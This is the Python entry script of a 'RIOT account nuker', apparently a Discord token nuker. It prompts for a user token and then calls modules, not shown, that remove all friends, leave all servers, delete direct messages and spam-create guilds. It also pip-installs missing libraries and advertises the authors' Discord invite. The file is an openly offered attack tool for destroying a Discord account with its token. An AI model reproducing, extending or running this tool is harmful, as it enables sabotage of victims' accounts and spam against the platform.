import os, requests, shutil

import modules.removefriends
import modules.serverleaver
import modules.dmremover
import modules.serverspammer

missing_libs = []

try: import colorama # colorama
except ImportError: missing_libs.append("colorama")

try: import pystyle # pystyle
except ImportError: missing_libs.append("pystyle")

try: import requests
except ImportError: missing_libs.append("requests")

for lib in missing_libs:
    os.system(f"pip install {lib}")

if len(missing_libs) > 0:
    os.system("python main.py")

from colorama import Fore
from pystyle import Colors, Colorate, Center

def printart():
    ascii_art = f"""
 ██▀███   ██▓ ▒█████  ▄▄▄█████▓    ▄▄▄       ▄████▄   ▄████▄   ▒█████   █    ██  ███▄    █ ▄▄▄█████▓    ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▓██ ▒ ██▒▓██▒▒██▒  ██▒▓  ██▒ ▓▒   ▒████▄    ▒██▀ ▀█  ▒██▀ ▀█  ▒██▒  ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▓██ ░▄█ ▒▒██▒▒██░  ██▒▒ ▓██░ ▒░   ▒██  ▀█▄  ▒▓█    ▄ ▒▓█    ▄ ▒██░  ██▒▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
▒██▀▀█▄  ░██░▒██   ██░░ ▓██▓ ░    ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒▒██   ██░▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░██▓ ▒██▒░██░░ ████▓▒░  ▒██▒ ░     ▓█   ▓██▒▒ ▓███▀ ░▒ ▓███▀ ░░ ████▓▒░▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░    ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
░ ▒▓ ░▒▓░░▓  ░ ▒░▒░▒░   ▒ ░░       ▒▒   ▓▒█░░ ░▒ ▒  ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░      ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ░▒ ░ ▒░ ▒ ░  ░ ▒ ▒░     ░         ▒   ▒▒ ░  ░  ▒     ░  ▒     ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░░   ░ ▒░    ░       ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
  ░░   ░  ▒ ░░ ░ ░ ▒    ░           ░   ▒   ░        ░        ░ ░ ░ ▒   ░░░ ░ ░    ░   ░ ░   ░            ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
   ░      ░      ░ ░                    ░  ░░ ░      ░ ░          ░ ░     ░              ░                      ░    ░     ░  ░      ░  ░   ░     
                                            ░        ░                                                                                            
"""
    print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(ascii_art)))
    creds = """
╔═══════════════════════════════════════╗
╬ Created by RIOT Administration        ╬
╬ Invite: https://discord.gg/4TyqkDXtBa ╬
╚═══════════════════════════════════════╝

"""
    print(Colorate.Vertical(Colors.blue_to_purple, Center.XCenter(creds)))

def cls():
    os.system("cls")

def pause():
    os.system("pause")

class destroy:
    def __init__(self, usertoken):
        self.token = usertoken
        self.__mainfunc__()
    def __mainfunc__(self):
        print(f"{Fore.CYAN}REMOVING FRIENDS\n")
        self.removefriends()
        print(f"{Fore.CYAN}LEAVING SERVERS\n")
        self.leaveservers()
        print(f"{Fore.CYAN}REMOVING DMS\n")
        self.removedms()
        print(f"{Fore.CYAN}SPAM CREATING GUILDS\n")
        self.spamservers()
    def removefriends(self):
        usertoken = self.token
        modules.removefriends.user_token = usertoken
        modules.removefriends.start()
    def leaveservers(self):
        usertoken = self.token
        modules.serverleaver.user_token = usertoken
        modules.serverleaver.start()
    def removedms(self):
        usertoken = self.token
        modules.dmremover.user_token = usertoken
        modules.dmremover.start()
    def spamservers(self):
        usertoken = self.token
        modules.serverspammer.user_token = usertoken
        modules.serverspammer.start()
        

def main():
    if os.path.exists("modules\\__pycache__"):
        shutil.rmtree("modules\\__pycache__")
    cls()
    os.system("mode con: cols=148 lines=30")
    printart()
    token = input(f"{Fore.BLUE}TOKEN[]: {Fore.WHITE}")
    cls()
    printart()
    print(f"{Fore.MAGENTA}TOKEN[{token}]")
    confirm = input(f"{Fore.BLUE}CONFIRM[Y/N]: {Fore.WHITE}").lower()
    if confirm == "y":
        cls()
        printart()
        print(f"{Fore.MAGENTA}TOKEN[{token}]")
        print(f"{Fore.MAGENTA}CONFIRM[Y]\n")
        pass
    else:
        return
    
    print(f"{Fore.BLUE}Initializing token nuker...\n")
    _init = destroy(usertoken=token)


if __name__ == '__main__':
    main()